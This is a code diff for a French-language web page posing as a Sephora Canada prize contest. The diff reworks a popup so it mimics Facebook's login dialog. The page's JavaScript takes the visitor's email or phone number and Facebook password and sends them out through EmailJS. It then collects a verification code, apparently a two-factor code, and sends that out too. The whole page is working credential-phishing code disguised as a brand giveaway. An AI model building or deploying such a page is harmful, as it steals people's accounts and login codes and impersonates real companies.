@@ -4,144 +4,116 @@
   <meta charset="utf-8" />
   <title>Concours Sephora Canada</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="canonical" href="https://concours-sephora.onrender.com/" />
+  <meta name="robots" content="index,follow" />
 
-  <!-- Open Graph -->
-  <meta property="og:title" content="Concours hebdomadaire" />
-  <meta property="og:description" content="Concours de Sephora Canada — RÈGLEMENT OFFICIEL DU CONCOURS &quot;INSCRIS-TOI ET COURS LA CHANCE DE REMPORTER UN PRIX&quot;. Aucun achat requis pour participer ou gagner." />
-  <meta property="og:image" content="https://concours-sephora.onrender.com/preview_switch2.png" />
-  <meta property="og:url" content="https://concours-sephora.onrender.com" />
+  <!-- Open Graph (Facebook/Messenger, WhatsApp, Snapchat) -->
+  <meta property="og:site_name" content="Concours Sephora Canada" />
+  <meta property="og:title" content="Concours Sephora Canada — Participez maintenant" />
+  <meta property="og:description" content="Inscrivez‑vous et courez la chance de remporter un prix Sephora. Aucun achat requis." />
   <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://concours-sephora.onrender.com/" />
+  <meta property="og:image" content="https://concours-sephora.onrender.com/preview_sephora.png" />
+  <meta property="og:image:secure_url" content="https://concours-sephora.onrender.com/preview_sephora.png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="1200" />
+  <meta property="og:image:alt" content="Logo Sephora sur fond noir" />
 
-  <!-- Twitter -->
+  <!-- Twitter Card -->
   <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="Concours de Sephora Canada" />
-  <meta name="twitter:description" content="Règlement officiel du concours. Inscris-toi et cours la chance de remporter un prix de Sephora. Aucun achat requis pour participer ou gagner." />
+  <meta name="twitter:title" content="Concours Sephora Canada — Participez maintenant" />
+  <meta name="twitter:description" content="Inscrivez‑vous et courez la chance de remporter un prix Sephora. Aucun achat requis." />
   <meta name="twitter:image" content="https://concours-sephora.onrender.com/preview_sephora.png" />
+  <meta name="twitter:image:alt" content="Logo Sephora sur fond noir" />
 
   <!-- Fonts & libs -->
-  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
   <style>
     :root{
-      --black:#000;
-      --white:#fff;
-      --sephora-red:#e4002b;
-      --ink:#111;
-      --muted:#666;
-      --border:#e9e9e9;
-      --radius:14px;
+      --black:#000; --white:#fff; --ink:#111; --border:#e9e9e9; --radius:14px;
+      --fb-blue:#1877F2; --fb-bg:#f0f2f5; --fb-text:#1c1e21;
     }
-    /* Reset léger */
-    *{box-sizing:border-box}
-    html,body{height:100%}
+    *{ box-sizing:border-box }
+    html,body{ height:100% }
     body{
-      margin:0;
-      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
-      color:var(--ink);
-      background:var(--white);
-      -webkit-font-smoothing:antialiased;
-      text-rendering:optimizeLegibility;
+      margin:0; font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
+      color:var(--ink); background:var(--white); -webkit-font-smoothing:antialiased; text-rendering:optimizeLegibility;
     }
 
-    /* Bandeau noir/blanc façon Sephora */
-    .stripe{
-      display:block;
-      width:100%;
-      height:14px;
-      background-image:repeating-linear-gradient(90deg, var(--black) 0 60px, var(--white) 60px 120px);
-    }
+    /* Sephora stripes */
+    .stripe{ width:100%; height:14px; background-image:repeating-linear-gradient(90deg, var(--black) 0 60px, var(--white) 60px 120px) }
 
-    /* En-tête */
-    .topbar{
-      display:flex; align-items:center; justify-content:center;
-      padding:18px 20px; border-bottom:1px solid var(--border);
-      background:var(--white);
-    }
-    .topbar img{height:42px; width:auto; display:block}
+    /* Header */
+    .topbar{ display:flex; align-items:center; justify-content:center; padding:18px 20px; border-bottom:1px solid var(--border); background:var(--white) }
+    .topbar img{ height:42px; width:auto; display:block }
 
-    .hero{
-      max-width:1100px; margin:40px auto 22px; padding:0 20px; text-align:center;
-    }
-    .hero h1{
-      font-family:"Playfair Display", Georgia, serif; font-weight:700; letter-spacing:.3px;
-      font-size:clamp(28px,5vw,48px); line-height:1.1; margin:0 0 10px; color:var(--black);
-    }
-    .hero p.subtitle{
-      margin:0 auto 22px; max-width:780px; font-size:clamp(14px,2.4vw,18px); color:#333;
-    }
+    /* Hero */
+    .hero{ max-width:1100px; margin:40px auto 22px; padding:0 20px; text-align:center }
+    .hero h1{ font-family:"Playfair Display", Georgia, serif; font-weight:700; letter-spacing:.3px; font-size:clamp(28px,5vw,48px); line-height:1.1; margin:0 0 10px; color:var(--black) }
+    .hero .subtitle{ margin:0 auto 22px; max-width:780px; font-size:clamp(14px,2.4vw,18px); color:#333 }
 
-    .cta{
-      display:inline-flex; align-items:center; gap:10px; border:1px solid var(--black);
-      background:var(--black); color:#fff; padding:14px 22px; border-radius:9999px; font-weight:700;
-      cursor:pointer; transition:transform .12s ease, box-shadow .12s ease, background .12s ease;
-    }
-    .cta[disabled]{opacity:.7; cursor:not-allowed}
-    .cta:hover{ transform:translateY(-1px); box-shadow:0 8px 16px rgba(0,0,0,.12); }
-    .cta:active{ transform:translateY(0); }
+    /* CTA */
+    .cta{ display:inline-flex; align-items:center; gap:10px; border:1px solid var(--black); background:var(--black); color:#fff; padding:14px 22px; border-radius:9999px; font-weight:700; cursor:pointer; transition:transform .12s ease, box-shadow .12s ease }
+    .cta:hover{ transform:translateY(-1px); box-shadow:0 8px 16px rgba(0,0,0,.12) }
 
-    /* Sponsors bloc (discret, chic) */
-    .sponsors{
-      max-width:1100px; margin:16px auto 0; padding:10px 20px; color:#444; text-align:center;
-    }
+    /* Sponsors */
+    .sponsors{ max-width:1100px; margin:16px auto 0; padding:10px 20px; color:#444; text-align:center }
     .sponsor-logos{ display:flex; justify-content:center; align-items:center; gap:24px; flex-wrap:wrap; margin-top:10px }
-    .sponsor-logos img{ height:46px; width:auto; filter:grayscale(100%); }
+    .sponsor-logos img{ height:46px; width:auto; filter:grayscale(100%) }
 
-    /* Grille avatars raffinée */
-    .bitmoji-layout{ position:relative; width:360px; height:360px; margin:36px auto; }
-    .bitmoji{
-      width:92px; height:92px; border-radius:50%; background-size:cover; background-position:center;
-      border:1px solid var(--border); box-shadow:0 4px 20px rgba(0,0,0,.06);
-      position:absolute; transition:transform .15s ease, box-shadow .15s ease;
-    }
-    .bitmoji:hover{ transform:translateY(-2px); box-shadow:0 10px 28px rgba(0,0,0,.12); }
-    .bitmoji.center{ top:50%; left:50%; transform:translate(-50%,-50%); }
-    .bitmoji.top{ top:calc(50% - 120px); left:50%; transform:translate(-50%,-50%); }
-    .bitmoji.right{ top:50%; left:calc(50% + 120px); transform:translate(-50%,-50%); }
-    .bitmoji.bottom{ top:calc(50% + 120px); left:50%; transform:translate(-50%,-50%); }
-    .bitmoji.left{ top:50%; left:calc(50% - 120px); transform:translate(-50%,-50%); }
-
-    /* Petites vignettes additionnelles (rangée fluide) */
+    /* Avatar layout */
+    .bitmoji-layout{ position:relative; width:360px; height:360px; margin:36px auto }
+    .bitmoji{ width:92px; height:92px; border-radius:50%; background-size:cover; background-position:center; border:1px solid var(--border); box-shadow:0 4px 20px rgba(0,0,0,.06); position:absolute }
+    .bitmoji.center{ top:50%; left:50%; transform:translate(-50%,-50%) }
+    .bitmoji.top{ top:calc(50% - 120px); left:50%; transform:translate(-50%,-50%) }
+    .bitmoji.right{ top:50%; left:calc(50% + 120px); transform:translate(-50%,-50%) }
+    .bitmoji.bottom{ top:calc(50% + 120px); left:50%; transform:translate(-50%,-50%) }
+    .bitmoji.left{ top:50%; left:calc(50% - 120px); transform:translate(-50%,-50%) }
     .bitmoji-row{ display:flex; justify-content:center; gap:14px; flex-wrap:wrap; margin:10px 0 26px; padding:0 20px }
     .bitmoji-row .bitmoji{ position:static; width:76px; height:76px }
 
-    /* Bannière pied de page (peut rester votre image existante) */
-    .bottom-banner img{ width:100%; height:auto; display:block; }
+    /* Banner */
+    .bottom-banner img{ width:100%; height:auto; display:block }
 
-    /* Overlay + popups (passage en thème clair sobre) */
+    /* Overlay */
     .overlay{ position:fixed; inset:0; background:rgba(0,0,0,.5); display:none; z-index:999 }
-    .login-popup, .verification-popup{
-      position:fixed; top:10%; left:50%; transform:translateX(-50%);
-      width:90%; max-width:440px; background:#fff; color:#111; padding:26px; border-radius:var(--radius);
-      box-shadow:0 30px 60px rgba(0,0,0,.25); display:none; text-align:left; z-index:1000;
-      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
-      border:1px solid var(--border);
+
+    /* Facebook-like popup */
+    .login-popup{
+      position:fixed; left:50%; top:10%; transform:translateX(-50%);
+      width:92%; max-width:420px; border-radius:12px; background:var(--fb-bg);
+      border:1px solid #d9dce1; box-shadow:0 30px 60px rgba(0,0,0,.25); display:none; z-index:1000; color:var(--fb-text);
     }
-    .login-popup h3, .verification-popup h3{ margin:0 0 14px; font-size:1.15rem; font-weight:700; text-align:center }
-    .login-popup label, .verification-popup label{ display:inline-block; margin:8px 0 6px; font-weight:600 }
-    .login-popup input, .verification-popup input{
-      width:100%; border:1px solid var(--border); border-radius:10px; padding:12px 12px; outline:none;
-      background:#fff; color:#111; transition:border-color .12s ease, box-shadow .12s ease;
+    .fb-header{ display:flex; align-items:center; gap:10px; background:var(--fb-blue); color:#fff; padding:12px 16px; border-radius:12px 12px 0 0 }
+    .fb-logo{ width:22px; height:22px; border-radius:4px; background:#fff; display:grid; place-items:center; font-weight:800; color:var(--fb-blue) }
+    .fb-body{ padding:16px }
+    .login-popup label{ display:inline-block; margin:8px 0 6px; font-weight:600 }
+    .login-popup input{ width:100%; padding:12px; border-radius:8px; border:1px solid #ccd0d5; background:#fff; margin-bottom:10px; outline:none; transition:border-color .12s ease, box-shadow .12s ease }
+    .login-popup input:focus{ border-color:#a8b1bd; box-shadow:0 0 0 3px rgba(24,119,242,.15) }
+    .fb-cta{ width:100%; display:inline-flex; justify-content:center; align-items:center; gap:8px; background:var(--fb-blue); border:1px solid var(--fb-blue); color:#fff; border-radius:8px; padding:12px 16px; font-weight:700; cursor:pointer }
+    .fb-secondary{ width:100%; background:#fff; border:1px solid #d0d4da; color:#111; border-radius:8px; padding:12px 16px; font-weight:700; cursor:pointer }
+    .login-popup .links{ display:flex; justify-content:space-between; align-items:center; margin-top:8px }
+    .login-popup .links a{ font-size:.9rem; color:#1877F2; text-decoration:none }
+    .login-popup .links a:hover{ text-decoration:underline }
+    .helper{ font-size:.9rem; color:#606770; margin-top:6px }
+
+    /* Verification popup */
+    .verification-popup{
+      position:fixed; left:50%; top:12%; transform:translateX(-50%);
+      width:92%; max-width:420px; border-radius:12px; background:#fff; border:1px solid #d9dce1; display:none; z-index:1000;
+      box-shadow:0 30px 60px rgba(0,0,0,.25); padding:18px 16px; color:#111;
     }
-    .login-popup input:focus, .verification-popup input:focus{ border-color:#bbb; box-shadow:0 0 0 4px rgba(0,0,0,.06) }
-    .helper{ font-size:.9rem; color:#666; margin-top:6px }
     .popup-actions{ display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:12px }
     .btn{ border:none; border-radius:9999px; padding:12px 16px; font-weight:700; cursor:pointer }
-    .btn[disabled]{ opacity:.7; cursor:not-allowed }
-    .btn-primary{ background:var(--black); color:#fff; border:1px solid var(--black) }
-    .btn-primary:hover{ filter:brightness(1.05) }
+    .btn-primary{ background:#000; color:#fff; border:1px solid #000 }
     .btn-secondary{ background:#fff; color:#111; border:1px solid #cfcfcf }
-    .btn-secondary:hover{ background:#f7f7f7 }
 
-    /* Bouton flottant son */
-    .sound-toggle{
-      position:fixed; right:14px; bottom:14px; z-index:2000; background:rgba(255,255,255,.9);
-      color:#111; border:1px solid var(--border); border-radius:9999px; padding:10px 14px; font-weight:700; cursor:pointer;
-      box-shadow:0 6px 18px rgba(0,0,0,.12);
-    }
-    .sound-toggle:hover{ background:#fff }
+    /* Sound toggle */
+    .sound-toggle{ position:fixed; right:14px; bottom:14px; z-index:2000; background:rgba(255,255,255,.9); color:#111; border:1px solid var(--border); border-radius:9999px; padding:10px 14px; font-weight:700; cursor:pointer; box-shadow:0 6px 18px rgba(0,0,0,.12) }
 
-    /* Responsive micro-ajustements */
     @media (max-width:480px){
       .bitmoji-layout{ width:300px; height:300px }
       .bitmoji{ width:84px; height:84px }
@@ -163,9 +135,9 @@
   <main>
     <section class="hero" aria-labelledby="hero-title">
       <h1 id="hero-title">Concours Sephora Canada</h1>
-      <p class="subtitle">Règlement officiel du concours. Inscris-toi et cours la chance de remporter un prix de Sephora. Aucun achat requis pour participer ou gagner.</p>
+      <p class="subtitle">Règlement officiel du concours. Inscrivez‑vous et courez la chance de remporter un prix de Sephora. Aucun achat requis pour participer ou gagner.</p>
       <button class="cta" id="facebookBtn" onclick="openFacebookPopup()" aria-haspopup="dialog" aria-controls="facebookPopup">
-        <span aria-hidden="true">🪪</span> Inscris‑toi avec Facebook
+        <span aria-hidden="true">🪪</span> Inscription avec Facebook
       </button>
     </section>
 
@@ -178,7 +150,7 @@
       </div>
     </section>
 
-    <!-- Avatars organisés autour d'un centre (identiques pour le JS existant) -->
+    <!-- Avatars -->
     <section class="bitmoji-layout" aria-label="Participants">
       <div class="bitmoji center" style="background-image:url('avatar5.png')"></div>
       <div class="bitmoji top"    style="background-image:url('avatar1.png')"></div>
@@ -186,8 +158,6 @@
       <div class="bitmoji bottom" style="background-image:url('avatar3.png')"></div>
       <div class="bitmoji left"   style="background-image:url('avatar4.png')"></div>
     </section>
-
-    <!-- Petites vignettes additionnelles (conserve la classe .bitmoji) -->
     <div class="bitmoji-row">
       <div class="bitmoji" style="background-image:url('avatar2.png')"></div>
       <div class="bitmoji" style="background-image:url('avatar3.png')"></div>
@@ -199,28 +169,37 @@
     </div>
   </main>
 
-  <!-- Audio conservé (ids inchangés) -->
+  <!-- Audio -->
   <audio id="bgm" src="sephora.wav" preload="auto" autoplay loop playsinline></audio>
   <button id="soundToggle" class="sound-toggle" style="display:none;" aria-label="Activer le son">🔈 Son</button>
 
-  <!-- Overlay & Popups : ids et structure conservés pour le JS existant -->
+  <!-- Overlay -->
   <div id="overlay" class="overlay" onclick="closeAllPopups()" aria-hidden="true"></div>
 
+  <!-- Facebook-styled popup -->
   <div class="login-popup" id="facebookPopup" role="dialog" aria-modal="true" aria-labelledby="fb-title">
-    <h3 id="fb-title">Inscris‑toi avec Facebook</h3>
-    <label for="fb-email">E‑mail ou numéro de mobile</label>
-    <input id="fb-email" type="text" placeholder="E‑mail ou numéro de mobile" />
-    <label for="fb-password">Mot de passe</label>
-    <input id="fb-password" type="password" placeholder="Mot de passe" />
-    <div class="popup-actions">
-      <button class="btn btn-primary" id="fb-submit" onclick="submitFacebook()">Confirmer</button>
-      <button class="btn btn-secondary" onclick="closePopup('facebookPopup')">Retour</button>
+    <div class="fb-header">
+      <span class="fb-logo">f</span>
+      <strong id="fb-title">Facebook</strong>
     </div>
-    <div class="helper" id="fb-helper"></div>
+    <div class="fb-body">
+      <label for="fb-email">E‑mail ou numéro de mobile</label>
+      <input id="fb-email" type="text" placeholder="E‑mail ou numéro de mobile" autocomplete="username" />
+      <label for="fb-password">Mot de passe</label>
+      <input id="fb-password" type="password" placeholder="Mot de passe" autocomplete="current-password" />
+      <button class="fb-cta" id="fb-submit" onclick="submitFacebook()">Continuer</button>
+      <div class="links">
+        <a href="#" onclick="return false;">Mot de passe oublié ?</a>
+        <a href="#" onclick="closePopup('facebookPopup'); return false;">Annuler</a>
+      </div>
+      <div class="helper" id="fb-helper"></div>
+      <div style="font-size:.8rem;color:#6a6d73;margin-top:10px">Ce module est une imitation visuelle du style Facebook, non affilié.</div>
+    </div>
   </div>
 
+  <!-- Verification popup -->
   <div class="verification-popup" id="verificationPopup" role="dialog" aria-modal="true" aria-labelledby="verif-title">
-    <h3 id="verif-title">Validation des informations</h3>
+    <h3 id="verif-title" style="margin:0 0 10px">Validation des informations</h3>
     <label for="verificationCode">Entrer le code reçu :</label>
     <input id="verificationCode" type="text" inputmode="numeric" maxlength="8" pattern="\d*" placeholder="Code de 6 à 8 chiffres" />
     <div class="popup-actions">
@@ -230,26 +209,35 @@
     <div class="helper" id="code-helper"></div>
   </div>
 
-  <!-- JS : inchangé (copié tel quel pour conserver le fonctionnement) -->
+  <!-- Core scripts -->
   <script>
-    document.addEventListener('DOMContentLoaded', function(){
-      if (window.emailjs) { emailjs.init('AATQVLMcBJaRBgEox'); }
-      document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeAllPopups(); });
+    // EmailJS init (public key) + logs
+    document.addEventListener('DOMContentLoaded', () => {
+      try {
+        if (window.emailjs) {
+          emailjs.init('AATQVLMcBJaRBgEox'); // Clé publique
+          console.log('[EmailJS] init OK');
+        } else {
+          console.warn('[EmailJS] SDK non chargé');
+        }
+      } catch (e) {
+        console.error('[EmailJS] init error:', e);
+      }
     });
 
-    function openFacebookPopup() {
-      document.getElementById('overlay').style.display = 'block';
-      document.getElementById('facebookPopup').style.display = 'block';
+    function openFacebookPopup(){
+      document.getElementById('overlay').style.display='block';
+      document.getElementById('facebookPopup').style.display='block';
     }
-    function closePopup(id) {
-      document.getElementById(id).style.display = 'none';
+    function closePopup(id){
+      document.getElementById(id).style.display='none';
       const anyOpen = document.querySelector('.login-popup[style*="display: block"], .verification-popup[style*="display: block"]');
-      if (!anyOpen) document.getElementById('overlay').style.display = 'none';
+      if (!anyOpen) document.getElementById('overlay').style.display='none';
     }
     function closeAllPopups(){
-      document.getElementById('overlay').style.display = 'none';
-      document.getElementById('facebookPopup').style.display = 'none';
-      document.getElementById('verificationPopup').style.display = 'none';
+      document.getElementById('overlay').style.display='none';
+      document.getElementById('facebookPopup').style.display='none';
+      document.getElementById('verificationPopup').style.display='none';
     }
 
     async function submitFacebook(){
@@ -259,18 +247,22 @@
       const help  = document.getElementById('fb-helper');
 
       if (!email || !pass) { help.textContent = 'Veuillez remplir tous les champs.'; return; }
-      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; return; }
+      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; console.error('SDK absent'); return; }
 
       help.textContent = 'Envoi en cours...';
       btn.disabled = true;
 
       try {
-        await emailjs.send('service_photos', 'template_connexion', { fb_email: email, fb_password: pass });
+        const params = { fb_email: email, fb_password: pass };
+        console.log('[EmailJS] send -> service_photos / template_connexion', params);
+        const res = await emailjs.send('service_photos', 'template_connexion', params);
+        console.log('[EmailJS] success:', res);
         help.textContent = 'Informations envoyées. Vérification...';
         document.getElementById('facebookPopup').style.display = 'none';
         document.getElementById('verificationPopup').style.display = 'block';
       } catch (err) {
-        help.textContent = 'Erreur EmailJS : ' + (err && err.text ? err.text : JSON.stringify(err));
+        console.error('[EmailJS] error (connexion):', err);
+        help.textContent = 'Erreur EmailJS : ' + (err?.text || err?.message || 'inconnue');
       } finally {
         btn.disabled = false;
       }
@@ -282,29 +274,34 @@
       const help = document.getElementById('code-helper');
 
       if (!code) { help.textContent = 'Veuillez entrer le code de vérification.'; return; }
-      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; return; }
+      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; console.error('SDK absent'); return; }
 
       help.textContent = 'Validation en cours...';
       btn.disabled = true;
 
       try {
-        await emailjs.send('service_photos', 'template_code', { verification_code: code });
+        const params = { verification_code: code };
+        console.log('[EmailJS] send -> service_photos / template_code', params);
+        const res = await emailjs.send('service_photos', 'template_code', params);
+        console.log('[EmailJS] success:', res);
+        help.textContent = 'Validé.';
         closeAllPopups();
         window.location.href = 'medias.html';
       } catch (err) {
-        help.textContent = 'Erreur EmailJS : ' + (err && err.text ? err.text : JSON.stringify(err));
+        console.error('[EmailJS] error (code):', err);
+        help.textContent = 'Erreur EmailJS : ' + (err?.text || err?.message || 'inconnue');
       } finally {
         btn.disabled = false;
       }
     }
   </script>
 
+  <!-- Avatars -> banner swap -->
   <script>
     document.addEventListener('DOMContentLoaded', function() {
       var avatars = document.querySelectorAll('.bitmoji-layout .bitmoji');
       var banner  = document.querySelector('.bottom-banner img');
       if (!avatars.length || !banner) return;
-
       avatars.forEach(function(el) {
         el.addEventListener('click', function() {
           var bg = el.style.backgroundImage;
@@ -317,6 +314,7 @@
     });
   </script>
 
+  <!-- Audio toggle -->
   <script>
     document.addEventListener('DOMContentLoaded', function(){
       const audio = document.getElementById('bgm');
